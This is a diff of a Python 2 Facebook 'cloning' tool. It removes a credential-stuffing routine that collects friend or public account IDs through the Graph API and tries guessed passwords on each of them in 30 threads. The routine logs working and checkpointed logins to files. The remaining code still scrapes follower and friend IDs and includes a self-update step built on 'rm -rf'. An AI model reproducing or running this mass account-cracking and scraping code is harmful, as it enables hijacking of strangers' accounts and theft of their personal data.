@@ -132,14 +132,11 @@ def menu():
 	print "|[✓] Name: "+name
 	print "|[✓] ID  : "+id
 	print (47*"-")
-	print "[1] Start Cloning."
-	print "[2] Clone With Fast Mode."
-	print "[3] Extract Tools."
-	print "[4] Lock Profile Tool."
-	print "[5] Auto Del Tools."
-	print "[6] Update jam Tool."
-	print "[7] Follow Me On Facebook."
-	print "[8] Logout"
+	print "[1] Extract Tools."
+	print "[2] Auto Del Tools."
+	print "[3] Update jam Tool."
+	print "[4] Follow Me On Facebook."
+	print "[5] Logout"
 	print ('                  ')
 	men()
 
@@ -149,27 +146,10 @@ def men():
 		print " Wrong Input"
 		men()
 	elif rana =="1":
-		crack()
-	elif rana =="2":
-	    os.system('clear')
-	    jam('[!] Please Wait While Page Is Loding.')
-	    sani('Stylish Queen-10%...')
-	    sani('Stylish Queen-20%...')
-	    sani('Stylish Queen-50%...')
-	    sani('Stylish Queen-70%...')
-	    sani('Stylish Queen-90%...')
-	    sani('Stylish Queen-100%...')
-	    os.system('python2 choice.py')
-	    time.sleep(1)
-	elif rana =="3":
 		grab()
-	elif rana =="4":
-		os.system('clear')
-		os.system('python locked.py')
-		time.sleep(1)
-	elif rana =="5":
+	elif rana =="2":
 		bot()
-	elif rana =="6":
+	elif rana =="3":
 		os.system('clear')
 		print banner
 		jam('[✓] Please Wait While Tool Is Updating')
@@ -179,10 +159,10 @@ def men():
 		time.sleep(3)
 		os.system('cd .. && rm -rf sani && cd sani')
 		os.system('python2 jam.py')
-	elif rana =="7":
+	elif rana =="4":
 		os.system('xdg-open https://www.facebook.com/jam.shahrukh.official')
 		menu()
-	elif rana =="8":
+	elif rana =="5":
 		os.system('rm -rf login.txt')
 		jam('[✓] Logged Out Successfully')
 		os.system('python2 jam.py')
@@ -190,204 +170,6 @@ def men():
 		print "[!] Wrong Input"
 		men()
 	
-##### INFO #####
-def crack():
-	global toket
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"Token invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		os.system('python2 jam.py')
-	os.system('clear')
-	print banner
-	print "[1] Clone From Friendlist."
-	print "[2] Clone From Any Public ID."
-	print "[3] Clone From File."
-	print "[0] Back."
-	crack_menu()
-
-def crack_menu():
-	crm = raw_input("Choose Option >>  ")
-	if crm =="":
-		print "[!] Filled Incorrectly"
-		crack_menu()
-	elif crm =="1":
-		os.system('clear')
-		print banner
-		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-                pass3 = raw_input(' \033[1;92m[3]Password: ')
-		pass4 = raw_input(' \033[1;92m[4]Password: ')
-                pass5 = raw_input(' \033[1;92m[5]Password: ')
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for s in z['data']:
-			id.append(s['id'])
-	elif crm =="2":
-		os.system('clear')
-		print banner
-		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-                pass3 = raw_input(' \033[1;92m[3]Password: ')
-		pass4 = raw_input(' \033[1;92m[4]Password: ')
-                pass5 = raw_input(' \033[1;92m[5]Password: ')
-		idt = raw_input("[+] Input ID: ")
-		
-		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			jam('\033[1;97m[✓] Account Name \033[1;97m:\033[1;97m '+op['name'])
-		except KeyError:
-			print"[!] ID Not Found!"
-			raw_input("\nPress Enter To Back  ")
-			crack()
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for i in z['data']:
-			id.append(i['id'])
-	elif crm =="3":
-	    os.system('clear')
-	    print banner
-	    p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-            p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-            pass3 = raw_input(' \033[1;92m[3]Password: ')
-	    pass4 = raw_input(' \033[1;92m[4]Password: ')
-            pass5 = raw_input(' \033[1;92m[5]Password: ')
-	    try:
-	        idlist= raw_input('[+] File Name: ')
-	        for line in open(idlist ,'r').readlines():
-	            id.append(line.strip())
-	    except IOError:
-	         print"[!] File Not Found."
-	         raw_input('Press Enter To Back. ')
-	         crack()
-	   
-	        
-	        
-	elif crm =="0":
-		menu()
-	else:
-		print "Filled Incorrectly"
-		crack_menu()
-	
-        jam('[✓] Total Friends: '+str(len(id)))
-        time.sleep(0.5)
-	jam('[✓] The Process Has Been Started.')
-	time.sleep(0.5)
-        jam('[!] To Stop Process Press CTRL Then Z')
-        time.sleep(0.5)
-        print (47*"-")
-     
-	
-	
-			
-	def main(arg):
-		global cpb,oks
-		user = arg
-                (uid, name) = user.split('|')
-		try:
-		    os.mkdir('/sdcard/ids')
-		except OSError:
-		    pass
-		try:
-                    pass1 = name.lower() + p1
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = br.addheader).text
-                    q = json.loads(data)
-                    if 'loc' in q:
-                        print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass1
-                        ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                        ok.write(uid + ' | ' + pass1 + '\n')
-                        ok.close()
-                        oks.append(uid + pass1)
-                    elif 'www.facebook.com' in q['error']:
-                        print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass1
-                        cp = open('jam_CP.txt', 'a')
-                        cp.write(uid + ' | ' + pass1 + '\n')
-                        cp.close()
-                        cps.append(uid + pass1)
-		    else:
-			pass2 = name.lower() + p2
-                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = br.addheader).text
-                        q = json.loads(data)
-                        if 'loc' in q:
-                            print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass2
-                            ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                            ok.write(uid + ' | ' + pass2 + '\n')
-                            ok.close()
-                            oks.append(uid + pass2)
-                        elif 'www.facebook.com' in q['error']:
-                            print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass2
-                            cp = open('jam_CP.txt', 'a')
-                            cp.write(uid + ' | ' + pass2 + '\n')
-                            cp.close()
-                            cps.append(uid + pass2)
-			else:
-                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = br.addheader).text
-                            q = json.loads(data)
-                            if 'loc' in q:
-                                print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass3
-                                ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                                ok.write(uid + ' | ' + pass3 + '\n')
-                                ok.close()
-                                oks.append(uid + pass3)
-                            elif 'www.facebook.com' in q['error']:
-                                print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass3
-                                cp = open('jam_CP.txt', 'a')
-                                cp.write(uid + ' | ' + pass3 + '\n')
-                                cp.close()
-                                cps.append(uid + pass3)
-			    else:
-				data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = br.addheader).text
-                                q = json.loads(data)
-                                if 'loc' in q:
-                                    print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass4
-                                    ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                                    ok.write(uid + ' | ' + pass4 + '\n')
-                                    ok.close()
-                                    oks.append(uid + pass4)
-                                elif 'www.facebook.com' in q['error']:
-                                    print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass4
-                                    cp = open('jam_CP.txt', 'a')
-                                    cp.write(uid + ' | ' + pass4 + '\n')
-                                    cp.close()
-                                    cps.append(uid + pass4)
-				else:
-				    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = br.addheader).text
-                                    q = json.loads(data)
-                                    if 'loc' in q:
-                                        print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass5
-                                        ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                                        ok.write(uid + ' | ' + pass5 + '\n')
-                                        ok.close()
-                                        oks.append(uid + pass5)
-                                    elif 'www.facebook.com' in q['error']:
-                                        print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass5
-                                        cp = open('jam_CP.txt', 'a')
-                                        cp.write(uid + ' | ' + pass5 + '\n')
-                                        cp.close()
-                                        cps.append(uid + pass5)
-		except:
-			pass
-		
-	p = ThreadPool(30)
-	p.map(main, id)
-	print "\033[1;97m----------------------------------------------"
-	jam('[✓] Process Has Been Completed.')
-	jam('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
-	xx = str(len(oks))
-	xxx = str(len(cps))
-	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(cps)))
-	print (47*"-")
-	
-	raw_input("\nPress Enter To Back ")
-	menu()	
-	
-
- 
-
 
 ##### Grab #####
 def grab():
@@ -657,8 +439,8 @@ def idfromfollow():
 			print"[!] Friend Not Found"
 			raw_input("Press Enter To Back ")
 			grab()
-		r=requests.get("https://graph.facebook.com/"+una+"/subscribers?limit=9999999&access_token="+toket)
-		z=json.loads(r.text)
+		r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
+		z = json.loads(r.text)
 		jam('[✓] Getting Followrs Extract IDs...')
 		print"--------------------------------------"
 		bz = open('/sdcard/ids/jam_follow.txt','w')
